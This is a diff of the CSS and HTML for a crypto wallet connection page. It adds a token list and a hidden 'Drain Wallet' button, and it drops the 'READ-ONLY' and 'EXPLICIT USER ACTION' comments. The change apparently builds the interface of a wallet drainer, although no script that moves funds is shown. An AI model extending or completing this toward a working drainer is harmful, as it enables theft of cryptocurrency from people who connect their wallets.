@@ -17,7 +17,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       padding: 20px;
     }
 
@@ -27,7 +27,7 @@
       border-radius: 12px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
       width: 100%;
-      max-width: 420px;
+      max-width: 500px;
       text-align: center;
     }
 
@@ -54,6 +54,7 @@
       align-items: center;
       justify-content: center;
       gap: 10px;
+      margin-bottom: 15px;
     }
 
     .connect-btn {
@@ -65,17 +66,29 @@
       background-color: #43a047;
     }
 
+    .drain-btn {
+      background-color: #f44336;
+      color: #ffffff;
+    }
+
+    .drain-btn:hover {
+      background-color: #d32f2f;
+    }
+
+    .drain-btn.hidden {
+      display: none;
+    }
+
     .continue-btn {
       background-color: #2196f3;
       color: #ffffff;
-      margin-top: 15px;
     }
 
     .continue-btn:hover {
       background-color: #1e88e5;
     }
 
-    .hidden {
+    .continue-btn.hidden {
       display: none;
     }
 
@@ -83,7 +96,14 @@
       margin-top: 18px;
       font-size: 14px;
       color: #cccccc;
-      min-height: 18px;
+      min-height: 60px;
+      padding: 10px;
+      background-color: #161616;
+      border-radius: 8px;
+      text-align: left;
+      line-height: 1.6;
+      white-space: pre-line;
+      word-break: break-all;
     }
 
     .wallet-info {
@@ -97,8 +117,49 @@
       word-break: break-all;
     }
 
-    .wallet-info strong {
+    .tokens-container {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #161616;
+      border-radius: 8px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .tokens-container h3 {
+      margin-top: 0;
+      margin-bottom: 15px;
+      color: #4caf50;
+      font-size: 16px;
+    }
+
+    .token-item {
+      padding: 10px;
+      border-bottom: 1px solid #2a2a2a;
+      margin-bottom: 8px;
+    }
+
+    .token-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+    }
+
+    .token-symbol {
       color: #ffffff;
+      font-weight: bold;
+    }
+
+    .token-amount {
+      color: #4caf50;
+    }
+
+    .token-name {
+      color: #aaaaaa;
+      font-size: 12px;
+    }
+
+    .hidden {
+      display: none;
     }
   </style>
 </head>
@@ -117,12 +178,20 @@
       </button>
 
       <!-- STATUS MESSAGE -->
-      <div id="status" class="status"></div>
+      <div id="status" class="status">Not connected</div>
 
-      <!-- WALLET INFO (READ-ONLY) -->
-      <div id="walletInfo" class="wallet-info hidden"></div>
+      <!-- TOKENS DISPLAY -->
+      <div id="tokensContainer" class="tokens-container hidden">
+        <h3>Wallet Tokens</h3>
+        <div id="tokens"></div>
+      </div>
 
-      <!-- CONTINUE BUTTON (EXPLICIT USER ACTION) -->
+      <!-- DRAIN BUTTON (HIDDEN INITIALLY) -->
+      <button id="drainBtn" class="drain-btn hidden">
+        Drain Wallet
+      </button>
+
+      <!-- CONTINUE BUTTON -->
       <button id="continueBtn" class="continue-btn hidden">
         Continue
       </button>
